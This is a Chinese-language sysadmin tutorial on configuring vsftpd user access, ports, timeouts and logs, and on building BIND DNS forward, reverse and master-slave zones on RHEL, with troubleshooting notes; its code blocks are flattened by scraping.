vsftpd.user_list文件需要与vsftpd.conf文件中的配置项结合来实现对于vsftpd.user_list文件中指定用户账号的访问控制： （1）设置禁止登录的用户账号 当vsftpd.conf配置文件中包括以下设置时，vsftpd.user_list文件中的用户账号被禁止进行FTP登录： 12userlist_enable=YESuserlist_deny=YES userlist_enable设置项设置使用vsftpd.user_list文件，userlist_deny设置为YES表示vsftpd.user_list文件用于设置禁止的用户账号。 （2）设置只允许登录的用户账号 当vsftpd.conf配置文件中包括以下设置时，只有vsftpd.user_list文件中的用户账号能够进行FTP登录： 12userlist_enable=YESuserlist_deny=NO userlist_enable设置项设置使用vsftpd.user_list文件，userlist _deny设置为NO表示vsftpd.usre_list文件用于设置只允许登录的用户账号，文件中未包括的用户账号被禁止FTP登录。 userlist_deny和userlist_enable选项限制用户登录FTP服务器（使用userlist_deny选项和user_list文件一起能有效阻止root,apache,www等系统用户登录FTP服务器，从而保证FTP服务器的分级安全性）。以下是两个选项的具体表现形式和两种搭配使用方式的效果： 配置 说明 Userlist_enable=YES Ftpusers中用户允许访问;User_list中用户允许访问 Userlist_enable=NO Ftpusers中用户禁止访问;User_list中用户允许访问 Userlist_deny=YES Ftpusers中用户禁止访问（登录时可以看到密码输入提示，但仍无法访问）;user_list 中用户禁止访问 Userlist_deny=NO ftpusers中用户禁止访问;user_list中用户允许访 Userlist_enable=YES 并且Userlist_deny=YES Ftpusers中用户禁止访问;User_list中用户禁止访问（登录时不会出现密码提示，直接被服务器拒绝） Userlist_enable=YES 并且Userlist_deny=NO Ftpusers中用户禁止访问;User_list中用户允许访问 修改默认端口 默认FTP服务器端口号是21，出于安全目的，有时需修改默认端口号，修改/etc/vsftpd/vsftpd.conf，添加语句(例)： listen_port=4449 语句指定了修改后FTP服务器的端口号，应尽量大于4000。修改后访问 #ftp 192.168.57.2 4449 注意这里需加上正确的端口号了，否则不能正常连接。 设置用户组 有关FTP用户和用户组的重要性，我们在之前介绍vsftpd的时候便已经提到过。这里主要是简单的说明用户组的技术实现，至于具体如何应用，还是具体需求具体对待。 1234567891011mkdir -p /home/try 递归创建新目录groupadd try 新建组useradd -g try -d /home/try try1 新建用户try1并指定家目录和属组useradd -g try -d /home/try try2 新建用户try2并指定家目录和属组useradd -g try -d /home/try try3 新建用户try3并指定家目录和属组passwd try1 为新用户设密码passwd try2 为新用户设密码passwd try3 为新用户设密码chown try1 /home/try 设置目录属主为用户try1chown .try /home/try 设置目录属组为组trychmod 750 /home/try 设置目录访问权限try1为读，写，执行；try2，try3为读，执行 由于本地用户登录FTP服务器后进入自己主目录，而try1,try2 try3对主目录/home/try分配的权限不同，所以通过FTP访问的权限也不同，try1访问权限为：上传，下载，建目录；try2，try3访问权限为下载，浏览，不能建目录和上传。实现了群组中用户不同访问级别，加强了对FTP服务器的分级安全管理。 连接超时（本部分内容由李洋提供） 配置空闲的用户会话的中断时间：如下配置将在用户会话空闲5分钟后被中断，以释放服务器的资源 Idle_session_timeout=300 配置空闲的数据连接的中断时间：如下配置将在数据空闲连接1分钟后被中断，同样也是为了释放服务器的资源 Data_connection_timeout=60 配置客户端空闲时的自动中断和激活连接的时间：如下配置将使客户端空闲1分钟后自动中断连接，并在30秒后自动激活连接 12Accept_timeout=60Connect_timeout=30 vsftpd的日志常见的vsftpd日志解决方案 在vsftpd.conf中有如下内容定义了日志的记录方式： 123456789# 表明FTP服务器记录上传下载的情况xferlog_enable=YES# 表明将记录的上传下载情况写在xferlog_file所指定的文件中，即xferlog_file选项指定的文件中xferlog_std_format=YESxferlog_file=/var/log/xferlog# 启用双份日志。在用xferlog文件记录服务器上传下载情况的同时，# vsftpd_log_file所指定的文件，即/var/log/vsftpd.log也将用来记录服务器的传输情况dual_log_enable=YESvsftpd_log_file=/var/log/vsftpd.log vsftpd的两个日志文件分析如下： /var/log/xferlog 记录内容举例 1Thu Sep 6 09:07:48 2007 7 192.168.57.1 4323279 /home/student/phpMyadmin-2.11.0-all-languages.tar.gz b -i r student ftp 0 * c /var/log/vsftpd.log 记录内容举例 12Tue Sep 11 14:59:03 2007 [pid 3460] CONNECT: Client &quot;127.0.0.1&quot;Tue Sep 11 14:59:24 2007 [pid 3459] [ftp] OK LOGIN;Client &quot;127.0.0.1&quot; ,anon password ” /var/log/xferlog日志文件中数据的分析和参数说明 |记录数据|参数名称|参数说明||Thu Sep 6 09:07:48 2007|当前时间|当前服务器本地时间，格式为： DDD MMM dd hh:mm:ss YYY||7|传输时间|传送文件所用时间，单位为秒||192.168.57.1|远程主机名称/IP|远程主机名称/IP||4323279|文件大小|传送文件的大小，单位为byte||/home/student/phpMyadmin-2.11.0-all-languages.tar.gz|文件名|传输文件名，包括路径||b|传输类型|传输方式的类型，包括两种：a以ASCII传输 b以二进制文件传输||–|特殊处理标志|特殊处理的标志位，可能的值包括：_ 不做任何特殊处理；C 文件是压缩格式；U 文件是非压缩格式；T 文件是tar格式||i|传输方向|文件传输方向，包括两种：o 从FTP服务器向客户端传输；i 从客户端向FTP服务器传输||r|访问模式|用户访问模式，包括：a 匿名用户；g 来宾用户；r 真实用户，即系统中的用户||student|用户名|用户名称||ftp|服务名|所使用的服务名称，一般为FTP||0|认证方式|认证方式，包括：0 无；1 RFC931认证|||认证用户id|认证用户的id，如果使用，则表示无法获得该id||c|完成状态|传输的状态：c 表示传输已完成；i 表示传输示完成| 常见的FTP命令，以及FTP数字代码的意义命令格式如下显示： 1234FTP命令 功能 FTP命令 功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119ls 显示服务器上的目录 ls [remote-dir][local-file] 显示远程目录remote-dir，并存入本地文件local-fileget remote-file [local-file] 从服务器下载指定文件到客户端 mget remote-files 下载多个远程文件(mget命令允许用通配符下载多个文件)put local-file [remote-file] 从客户端上传指定文件到服务器 mput local-file 将多个文件上传至远程主机(mput命令允许用通配符上传多个文件)open 连接FTP服务器 mdelete [remote-file] 删除远程主机文件close 中断与远程服务器的ftp会话（与open对应） mkdir dir-name 在远程主机中创建目录open host[port] 建立指定的ftp服务器连接，可指定连接端口 newer file-name 如果远程主机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件cd directory 改变服务器的工作目录 rename [from][to] 更改远程主机的文件名lcd directory 在客户端上(本地)改变工作目录 pwd 显示远程主机的当前工作目录bye 退出FTP命令状态 quit 同bye,退出ftp会话ascii 设置文件传输方式为ASCII模式 reget remote-file [local-file] 类似于get,但若local-file存在，则从上次传输中断处续传binary 设置文件传输方式为二进制模式 rhelp [cmd-name] 请求获得远程主机的帮助![cmd [args]] 在本地主机中交互shell后退回到ftp环境，如:!ls *.zip rstatus [file-name] 若未指定文件名，则显示远程主机的状态，否则显示文件状态accout [password] 提供登录远程系统成功后访问系统资源所需的密码 hash 每传输1024字节，显示一个hash符号（#）append local-file [remote-file] 将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名 restart marker 从指定的标志marker处，重新开始get或put，如restart 130bye 退出ftp会话过程 rmdir dir-name 删除远程主机目录case 在使用mget命令时，将远程主机文件名中的大写转为小写字母 size file-name 显示远程主机文件大小，如：size idle 7200cd remote-dir 进入远程主机目录 status 显示当前ftp状态cdup 进入远程主机目录的父目录 system 显示远程主机的操作系统delete remote-file 删除远程主机文件 user user-name [password][account] 向远程主机表明自己的身份，需要密码时，必须输入密码，如:user anonymous my@emaildir [remote-dir][local-file] 显示远程主机目录，并将结果存入本地文件 help [cmd] 显示ftp内部命令cmd的帮助信息，如help get FTP数字代码的意义 123456789101112131415161718192021222324252627282930313233343536373839110 重新启动标记应答。120 服务在多久时间内ready。125 数据链路端口开启，准备传送。150 文件状态正常，开启数据连接端口。200 命令执行成功。202 命令执行失败。211 系统状态或是系统求助响应。212 目录的状态。213 文件的状态。214 求助的讯息。215 名称系统类型。220 新的联机服务ready。221 服务的控制连接端口关闭，可以注销。225 数据连结开启，但无传输动作。226 关闭数据连接端口，请求的文件操作成功。227 进入passive mode。230 使用者登入。250 请求的文件操作完成。257 显示目前的路径名称。331 用户名称正确，需要密码。332 登入时需要账号信息。350 请求的操作需要进一部的命令。421 无法提供服务，关闭控制连结。425 无法开启数据链路。426 关闭联机，终止传输。450 请求的操作未执行。451 命令终止:有本地的错误。452 未执行命令:磁盘空间不足。500 格式错误，无法识别命令。501 参数语法错误。502 命令执行失败。503 命令顺序错误。504 命令所接的参数不正确。530 未登入。532 储存文件需要账户登入。550 未执行请求的操作。551 请求的命令终止，类型未知。552 请求的文件终止，储存位溢出。 553 未执行请求的的命令，名称不正确。 项目实践 设置vsftpd服务匿名用户能够对/var/ftp/test/目录有上传下载的权限。 系统用户能够访问家目录，上传下载删除 除了系统用户batman有chroot的权限，其他系统用户没有chroot的权限 总结","link":"/2016/12/23/booboo_easy_service/02_ftp/"},{"title":"DNS域名解析服务","text":"课程要求 在企业内部搭建一台域名解析服务器DNS正反解析 在企业内部搭建两台域名解析服务器做DNS主辅同步 DNS服务全称是domain name server域名解析服务。 我们知道每个联网的计算机都有一个ip地址吧？Ip地址是用来做什么的呢？Ip地址是用来和互联网上别的机器进行通讯的。但是ip地址很难记吧？一两个ip地址可能还好，但是，我们每天要访问的网页不仅仅只有一两个吧？ 我们记得都是什么呢？www.baidu.com. www.sina.com。我们记住的其实都是字符，都是域名。就像我们的电话号码，很难记，于是我们把电话号码存到手机里，给他起个昵称或者直接输入人名对吧，把电话号码对应成人名吧？然后打电话的时候就直接找到这个人名就好了。 所以我们系统也是一样，会把ip地址对应成一个主机名。在我们系统里有这么一个文件，就是专门用来做对应关系的，这个文件叫/etc/hosts/，我们可以打开来看一下，一条记录一行，行里面就是主机名和ip地址，当然一个ip地址可以对应多个主机名，就像人有很多的昵称一样。 那么这样是不是就解决问题了，当我们想要访问一个网站的时候，我们就不用输入ip地址，而是可以直接输入主机名就行了，机器会帮我们做一个解析，把主机名对应成ip地址进行通信。早期这样做的确没问题，但是随着互联网愈发的壮大，这个文件就不那么实用了。我们要在机器上配置大量的对应关系，是非常耗时，非常麻烦的，而且要配置的机器可不止一台。比如说我是百度，我希望世界上所有的人都要来访问我的网页，那么，我是不是需要让世界上所有的人都去添加我的ip地址和主机名的对应关系。这个是非常难做到的事情，工作量太大。于是我们就引入了一种新的机制。 DNS的实现原理这种机制的作用和hosts文件一样，但是实现方法却不一样，这个机制就叫DNS (Domain name server)。通过dns，我们可以解决这个大批量域名解析的问题。那具体是怎么实现的呢？这就是dns的结构方面的问题了。 我们之前说我们的系统是一个什么样的结构，是不是一个分层式的结构，这个结构的体现方式就是目录吧？对不对。Dns也是如此，它也采用了分层市管理的方式。 不过不同于目录，我们的目录是一个逻辑上的概念，用来帮助我们理解文件系统的一种方式。而dns，他是实实在在的一种管理结构。 那我们来看，目录的至高点是什么。是根吧，对不对，那么对于我们dns来说，既然是分层式管理结构，它也需要有一个至高点吧。这个至高点是什么呢？ 我们把它称作根域，以点代表根域。全世界总共有13台根域，是处于至高无上的位置的，只有13台机器。 那么根域下面就是顶级域了，通常我们看到的顶级域有这个com。有org，有cn还有edu等等，这些都是顶级域。顶级域下面管理二级域，以此类推。 FQDN：主机名加上域名，被称作完全合格的域名，fqdn。其实com后面应该有个点的，代表根域。只不过我们现在习惯性的将其省略了。就好像国家管理省，省管理市，市管理县等等 12345完整的域名 www.baidu.com.. 根域 全球一共13个根域.com 超级域，一级域.baidu 二级域www 主机名 举例：寻找新浪的方式。 先看本地/etc/hosts有没有记录。 找另外一个人问，–&gt;找DNS服务器去问。 在/etc/resolv.conf文件中指定了找谁去问。 当然，这先后顺序也是由某个文件决定的。这个文件是/etc/nsswitch.conf. Windows上面也有 网上邻居&gt;属性&gt;本地连接。 DNS的两种查询方式 对于DNS服务器，他可能知道也可能不知道， 知道的情况有两种： 本地有这个域，能够解析到 本地有缓存，其他人已经来问过sina是谁，那么DNS服务器可以将该结果直接返回给客户。 不知道的话就会去找自己的上级域，然后通过等待上级域的反馈，将反馈信息返回给客户端。这种方式叫做递归查询。 那么还有一种情况就是，DNS去询问上级域，然后上级域将对应的同级DNS服务器反馈回来，由客户端去询问新的DNS服务器来找寻网””址对应的IP地址。这种叫做迭代查询 12345www.sina.com.1)找根域.2)找超级域.com3)找二级域.sina4)成功找到www 实战项目1:在企业内部搭建一台域名解析服务器DNS正反解析 1)在rhel6上配置dns域名解析服务，解析uplooking.com域名，要求如下：1234567 NS @ A 172.25.0.11www A 172.25.0.10 MX 5 mailmail A 172.25.0.10ftp A 172.25.0.10bbs CNAME ftp2)配置反向解析172.25.0.10和172.25.0.11； 3)要求rhel6和rhel7这两台服务器的域名解析服务器为172.25.0.11这台服务器。 实验准备阶段 画出网络拓扑图 规划不同服务器需要安装的软件(os–soft版本) 开始安装 配置服务 启动服务 测试排错 详细步骤概览 num step man 1) 安装软件 bind bind-chroot 2) 查看软件架构 rpm -ql 日志 /var/log/named.log 数据 /var/named/ 配置 /etc/named.conf /etc/named.rfc1912.zones 3) 修改配置文件 4) 启动服务 service named daemon named 4.1） 排除错误 看日志 5) 测试 nslookup 5.1） 排错 看日志 网络拓扑图 规划服务器软件 开始安装 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596[root@rhel6 ~]# yum install -y bind bind-chrootLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.server | 3.9 kB 00:00 Setting up Install ProcessResolving Dependencies--&gt; Running transaction check---&gt; Package bind.x86_64 32:9.8.2-0.17.rc1.el6_4.6 will be installed---&gt; Package bind-chroot.x86_64 32:9.8.2-0.17.rc1.el6_4.6 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved================================================================================ Package Arch Version Repository Size================================================================================Installing: bind x86_64 32:9.8.2-0.17.rc1.el6_4.6 server 4.0 M bind-chroot x86_64 32:9.8.2-0.17.rc1.el6_4.6 server 71 kTransaction Summary================================================================================Install 2 Package(s)Total download size: 4.0 MInstalled size: 7.3 MDownloading Packages:(1/2): bind-9.8.2-0.17.rc1.el6_4.6.x86_64.rpm | 4.0 MB 00:00 (2/2): bind-chroot-9.8.2-0.17.rc1.el6_4.6.x86_64.rpm | 71 kB 00:00 --------------------------------------------------------------------------------Total 23 MB/s | 4.0 MB 00:00 Running rpm_check_debugRunning Transaction TestTransaction Test SucceededRunning Transaction Installing : 32:bind-9.8.2-0.17.rc1.el6_4.6.x86_64 1/2 Installing : 32:bind-chroot-9.8.2-0.17.rc1.el6_4.6.x86_64 2/2 Verifying : 32:bind-9.8.2-0.17.rc1.el6_4.6.x86_64 1/2 Verifying : 32:bind-chroot-9.8.2-0.17.rc1.el6_4.6.x86_64 2/2Installed: bind.x86_64 32:9.8.2-0.17.rc1.el6_4.6 bind-chroot.x86_64 32:9.8.2-0.17.rc1.el6_4.6 Complete![root@rhel6 ~]# rpm -ql bind/etc/NetworkManager/dispatcher.d/13-named/etc/logrotate.d/named/etc/named/etc/named.conf/etc/named.iscdlv.key/etc/named.rfc1912.zones/etc/named.root.key/etc/portreserve/named/etc/rc.d/init.d/named/etc/rndc.conf/etc/rndc.key/etc/sysconfig/named/usr/lib64/bind/usr/sbin/arpaname/usr/sbin/ddns-confgen/usr/sbin/dnssec-dsfromkey/usr/sbin/dnssec-keyfromlabel/usr/sbin/dnssec-keygen/usr/sbin/dnssec-revoke/usr/sbin/dnssec-settime/usr/sbin/dnssec-signzone/usr/sbin/genrandom/usr/sbin/isc-hmac-fixup/usr/sbin/lwresd/usr/sbin/named/usr/sbin/named-checkconf/usr/sbin/named-checkzone/usr/sbin/named-compilezone/usr/sbin/named-journalprint/usr/sbin/nsec3hash/usr/sbin/rndc/usr/sbin/rndc-confgen/usr/share/doc/bind-9.8.2... .../var/log/named.log/var/named/var/named/data/var/named/dynamic/var/named/named.ca/var/named/named.empty/var/named/named.localhost/var/named/named.loopback/var/named/slaves/var/run/named[root@rhel6 ~]# rpm -ql bind-chroot/var/named/chroot/var/named/chroot/dev/var/named/chroot/dev/null/var/named/chroot/dev/random/var/named/chroot/dev/zero 配置文件 /etc/named.conf1234567listen-on port 53 { any; };listen-on-v6 port 53 { any; };directory &quot;/var/named&quot;;dump-file &quot;/var/named/data/cache_dump.db&quot;; statistics-file &quot;/var/named/data/named_stats.txt&quot;; memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;allow-query { any; }; /etc/named.rfc1912.zones 1234567891011121314# 正解析# 域名--&gt;ipzone &quot;uplooking.com&quot; IN { type master; file &quot;named.uplooking&quot;; allow-update { none; };};# 反解析# ip---&gt;域名zone &quot;0.25.172.in-addr.arpa&quot; IN { type master; file &quot;named.arpa.uplooking&quot;; allow-update { none; };}; /var/named/named.uplooking 123456789101112131415$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum主机名 主要记录 ip NS @ A 172.25.0.11www A 172.25.0.10 MX 5 mailmail A 172.25.0.10ftp A 172.25.0.10bbs CNAME ftp注意 文件的所属者和所属组以及文件的ugo权限 named.arpa.uplooking 12345678910111213$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS uplooking.com.11 PTR uplooking.com.10 PTR www.uplooking.com.10 PTR mail.uplooking.com.10 PTR ftp.uplooking.com.10 PTR bbs.uplooking.com.注意： NS后面此时一定要将@换成域名uplooking.com.域名必须写完整的域名，带根域的 服务的启动 rhel6 service named start rhel7 systemctl start named 防火墙的关闭 rhel6 service iptables stop rhel7 systemctl stop firewalld 如果服务启动不了 那么尝试执行以下语句rndc-confgen -a -r /etc/named.conf 测试 /etc/hosts 系统管理员手动写 /etc/resolv.conf—-》指定找哪个域名解析服务器nameserver 172.25.0.11 通过nslookup命令 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@rhel6 named]# nslookup&gt; www.uplooking.comServer: 172.25.0.11Address: 172.25.0.11#53Name: www.uplooking.comAddress: 172.25.0.10&gt; mail.uplooking.comServer: 172.25.0.11Address: 172.25.0.11#53Name: mail.uplooking.comAddress: 172.25.0.10&gt; ftp.uplooking.comServer: 172.25.0.11Address: 172.25.0.11#53Name: ftp.uplooking.comAddress: 172.25.0.10&gt; uplooking.comServer: 172.25.0.11Address: 172.25.0.11#53Name: uplooking.comAddress: 172.25.0.11&gt; bbs.uplooking.comServer: 172.25.0.11Address: 172.25.0.11#53bbs.uplooking.com canonical name = ftp.uplooking.com.Name: ftp.uplooking.comAddress: 172.25.0.10&gt; 172.25.0.10Server: 172.25.0.11Address: 172.25.0.11#5310.0.25.172.in-addr.arpa name = bbs.uplooking.com.10.0.25.172.in-addr.arpa name = www.uplooking.com.10.0.25.172.in-addr.arpa name = mail.uplooking.com.10.0.25.172.in-addr.arpa name = ftp.uplooking.com.&gt; 172.25.0.11Server: 172.25.0.11Address: 172.25.0.11#5311.0.25.172.in-addr.arpa name = uplooking.com.&gt; exit 实战项目2:在企业内部搭建两台域名解析服务器做DNS主辅同步主辅同步：如果有数万台客户机在同一时间来访问DNS服务器，会导致服务器承受很大的压力，这时候我可能需要另外一个人来帮我分担压力，或者说如果主服务器遇到什么问题，我能有另外一个人直接顶上我的工作，这时候就可以用到一个辅助服务器了。 那么很显然，辅助服务器需要和主服务器用一样的配置，配置里写的数据也基本相同。对于我们DNS服务器来说，其实它的数据文件并不固定，对应的IP和主机名都可能会经常发生变化，那么当那个时候，我希望能够修改主机上的某一个文件的时候，从机上的文件也能够被自动被修改，保持两台机器完全同步一致。 这时候就有了一种配置方法，叫做主辅同步。 实验准备阶段 网络拓扑图 规划软件安装bind bind-chroot 修改配置文件12345#主服务器 /etc/named.rfc1912.zones 允许传输给从机 /var/named/named.uplooking 序列号从0改成日期 /var/named/named.arpa.uplooking 序列号从0改成日期#从服务器 /etc/named.conf any /etc/named.rfc1912.zones slave;masters;file 启动从机服务 查看从机缓冲/var/named/slaves/ 注意防火墙关闭 客户端测试服务 具体步骤 网络拓扑图 规划软件安装 主服务器： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768[root@rhel6 named]# vim /etc/named.rfc1912.zoneszone &quot;uplooking.com&quot; IN { type master; file &quot;named.uplooking&quot;; allow-update { none; }; allow-transfer { 172.25.0.10; }; ===&gt;允许从机172.25.0.10来读取};zone &quot;0.25.172.in-addr.arpa&quot; IN { type master; file &quot;named.arpa.uplooking&quot;; allow-update { none; }; allow-transfer { 172.25.0.10; }; ===&gt;允许从机172.25.0.10来读取};[root@rhel6 named]# pwd/var/named[root@rhel6 named]# lltotal 40drwxr-x---. 6 root named 4096 Aug 2 10:30 chrootdrwxrwx---. 2 named named 4096 Aug 2 11:03 datadrwxrwx---. 2 named named 4096 Aug 2 15:06 dynamic-rw-r-----. 1 root named 271 Aug 2 13:59 named.arpa.uplooking-rw-r-----. 1 root named 1892 Feb 18 2008 named.ca-rw-r-----. 1 root named 152 Dec 15 2009 named.empty-rw-r-----. 1 root named 152 Jun 21 2007 named.localhost-rw-r-----. 1 root named 168 Dec 15 2009 named.loopback-rw-r-----. 1 root named 224 Aug 2 11:34 named.uplookingdrwxrwx---. 2 named named 4096 Aug 14 2013 slaves[root@rhel6 named]# vim named.uplooking$TTL 1D@ IN SOA @ rname.invalid. ( 20160802 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 172.25.0.11www A 172.25.0.10 MX 5 mailmail A 172.25.0.10ftp A 172.25.0.10bbs CNAME ftp~ [root@rhel6 named]# vim named.arpa.uplooking$TTL 1D@ IN SOA @ rname.invalid. ( 20160802 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS uplooking.com.11 PTR uplooking.com.10 PTR www.uplooking.com.10 PTR mail.uplooking.com.10 PTR ftp.uplooking.com.10 PTR bbs.uplooking.com.[root@rhel6 named]# service named restartStopping named: . [ OK ]Starting named: [ OK ][root@rhel6 named]# service iptables stopiptables: Firewall is not running.[root@rhel6 named]# getenforceEnforcing 从服务器 123456789101112131415161718192021[root@rhel7 ~]# cat /etc/resolv.conf# Generated by NetworkManagerdomain example.comsearch example.comnameserver 172.25.254.254[root@rhel7 ~]# yum install -y bind*[root@rhel7 ~]# vim /etc/named.conf[root@rhel7 ~]# vim /etc/named.rfc1912.zoneszone &quot;uplooking.com&quot; IN { type slave; &lt;== 定义类型为奴隶 slave masters { 172.25.0.11; }; &lt;== 告诉计算机我的主人 master 是谁 file &quot;slaves/uploooking.com.zone&quot;; &lt;== 告诉计算机 zone 数据库地址在哪里,奴隶有专门的目录 allow-update { none; };};zone &quot;0.25.172.in-addr.arpa&quot; IN { type slave; masters { 172.25.0.11; }; file &quot;slaves/arpa.uplooking.zone&quot;; allow-update { none; };}; 服务启动与关闭 12345678[root@rhel7 ~]# systemctl stop firewalld[root@rhel7 ~]# getenforceEnforcing[root@rhel7 ~]# systemctl start named[root@rhel7 ~]# ll /var/named/slavestotal 8-rw-r--r--. 1 named named 381 Aug 2 03:54 arpa.uplooking.zone-rw-r--r--. 1 named named 463 Aug 2 03:54 uploooking.com.zone 测试 客户端 rhel7 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@rhel7 ~]# vim /etc/resolv.confnameserver 172.25.0.11[root@rhel7 ~]# nslookup&gt; www.uplooking.comServer: 172.25.0.11Address: 172.25.0.11#53Name: www.uplooking.comAddress: 172.25.0.10&gt; 172.25.0.10Server: 172.25.0.11Address: 172.25.0.11#5310.0.25.172.in-addr.arpa name = www.uplooking.com.10.0.25.172.in-addr.arpa name = mail.uplooking.com.10.0.25.172.in-addr.arpa name = ftp.uplooking.com.10.0.25.172.in-addr.arpa name = bbs.uplooking.com.&gt; 172.25.0.11Server: 172.25.0.11Address: 172.25.0.11#5311.0.25.172.in-addr.arpa name = uplooking.com.&gt; exit[root@rhel7 ~]# vim /etc/resolv.confnameserver 172.25.0.10[root@rhel7 ~]# nslookup&gt; www.uplooking.comServer: 172.25.0.10Address: 172.25.0.10#53Name: www.uplooking.comAddress: 172.25.0.10&gt; 172.25.0.11Server: 172.25.0.10Address: 172.25.0.10#5311.0.25.172.in-addr.arpa name = uplooking.com.&gt; 172.25.0.10Server: 172.25.0.10Address: 172.25.0.10#5310.0.25.172.in-addr.arpa name = bbs.uplooking.com.10.0.25.172.in-addr.arpa name = www.uplooking.com.10.0.25.172.in-addr.arpa name = ftp.uplooking.com.10.0.25.172.in-addr.arpa name = mail.uplooking.com.&gt; exit 排错记录服务启动不了1234567891011121314[root@rhel7 ~]# systemctl start namedJob for named.service failed. See &apos;systemctl status named.service&apos; and &apos;journalctl -xn&apos; for details.[root@rhel7 ~]# systemctl status named.servicenamed.service - Berkeley Internet Name Domain (DNS) Loaded: loaded (/usr/lib/systemd/system/named.service; disabled) Active: failed (Result: exit-code) since Tue 2016-08-02 04:19:20 EDT; 23s ago Process: 2297 ExecStartPre=/usr/sbin/named-checkconf -z /etc/named.conf (code=exited, status=1/FAILURE)Aug 02 04:19:20 rhel7 systemd[1]: Starting Berkeley Internet Name Domain (DNS)...Aug 02 04:19:20 rhel7 named-checkconf[2297]: /etc/named.rfc1912.zones:51: missing &apos;;&apos; before &apos;}&apos;Aug 02 04:19:20 rhel7 systemd[1]: named.service: control process exited, code=exited status=1Aug 02 04:19:20 rhel7 systemd[1]: Failed to start Berkeley Internet Name Domain (DNS).Aug 02 04:19:20 rhel7 systemd[1]: Unit named.service entered failed state. ps：当服务启动不了的时候，报错内容中说我们可以通过以下两个命令来查看，systemctl status named.service 或者 journalctl -xn此时我们可以去执行以下上面命令中的任何一个，都可以看到详细的报错信息。 Aug 02 04:19:20 rhel7 named-checkconf[2297]: /etc/named.rfc1912.zones:51: missing &apos;;&apos; before &apos;}&apos; 这条日志告诉我们，在配置文件/etc/named.rfc1912.zones的第51行中，&apos;}&apos;前少了一个&apos;;&apos;。因此我们根据日志中的提示去修改配置文件即可。 服务启动不了12345678910111213141516171819202122232425262728293031323334353637383940414243[root@rhel7 ~]# systemctl status namednamed.service - Berkeley Internet Name Domain (DNS) Loaded: loaded (/usr/lib/systemd/system/named.service; disabled) Active: failed (Result: exit-code) since Tue 2016-08-02 04:50:39 EDT; 1min 42s ago Process: 6541 ExecStartPre=/usr/sbin/named-checkconf -z /etc/named.conf (code=exited, status=1/FAILURE)Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0...al 0Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 1.0.0.127.in-addr.arpa/IN: loaded serial 0Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 0.in-addr.arpa/IN: loaded serial 0Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone uplooking.com/IN: loaded serial 20160802Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 19.25.172.in-addr.arpa/IN: loading from master file nam...oundAug 02 04:50:39 rhel7 named-checkconf[6541]: zone 19.25.172.in-addr.arpa/IN: not loaded due to errors.Aug 02 04:50:39 rhel7 named-checkconf[6541]: _default/19.25.172.in-addr.arpa/IN: file not foundAug 02 04:50:39 rhel7 systemd[1]: named.service: control process exited, code=exited status=1Aug 02 04:50:39 rhel7 systemd[1]: Failed to start Berkeley Internet Name Domain (DNS).Aug 02 04:50:39 rhel7 systemd[1]: Unit named.service entered failed state.Hint: Some lines were ellipsized, use -l to show in full.[root@rhel7 ~]# tail -n 15 /etc/named.rfc1912.zones};zone &quot;uplooking.com&quot; IN { type master; file &quot;named.uplooking&quot;; allow-update { none; }; allow-transfer { 172.25.19.10;};};zone &quot;19.25.172.in-addr.arpa&quot; IN { type master; file &quot;named.uplooking.arpa&quot;; allow-update { none; }; allow-transfer { 172.25.19.10; };};[root@rhel7 ~]# ll /var/named/named*-rw-r-----. 1 root named 330 Aug 2 04:50 /var/named/named.arpa.uplooking-rw-r-----. 1 root named 2076 Jan 28 2013 /var/named/named.ca-rw-r-----. 1 root named 152 Dec 15 2009 /var/named/named.empty-rw-r-----. 1 root named 152 Jun 21 2007 /var/named/named.localhost-rw-r-----. 1 root named 168 Dec 15 2009 /var/named/named.loopback-rw-r-----. 1 root named 295 Aug 2 04:50 /var/named/named.uplooking ps:问题出在数据文件名和配置文件中指定的数据文件名不一致。 file &quot;named.uplooking.arpa&quot;; /var/named/named.arpa.uplooking 主辅同步缓冲文件只有一个123[root@rhel7 ~]# ll /var/named/slaves/total 4-rw-r--r-- 1 named named 386 Jan 1 02:46 uplooking123.zoo ps:原因是/etc/named.rfc1912.zones中的配置有问题，指定缓冲的目录写少了一个s 123456zone \\&quot;uplooking.com\\&quot; IN { type slave; masters { 172.25.33.11; }; file \\&quot;slave/uplooking.zone\\&quot;; allow-update { none; }; }; 主辅同步将从机的数据文件指定位置放在非slaves目录从服务器的配置文件放置的位置不在slaves目录下，而在其他目录下，则同步不成功。原因从三处排查 配置文件 UGO权限 selinux权限 此处是由于selinux的问题，我们安装一个工具setroubleshoot帮助我们分析123Yum search setroubleshootYum -y install setroubleshootSealert -a audit.log看到关于布尔值的信息和关于安全上下文的信息: 1）设置布尔值setsebool -P named_write_master_zones 1 2）设置安全上下文，通过man named_selinux或者看一下slaves目录的安全上下文是什么根据slaves的安全上下文去改。12Chcon -t named_zone_t testChcon -u system_u -r object_r test然后将selinux打开，将test下的目录的同步过来的文件给删除，重启服务，看是否被同步过来。 同步成功。 如果启动服务时候太慢可以使用/usr/sbin/rndc-confgen -a -r /etc/named.conf 这是一个秘钥加密产生的bug 有顺序的批量配置的写法：（简单了解一下）12$GENERATE 1-100 stu$ A 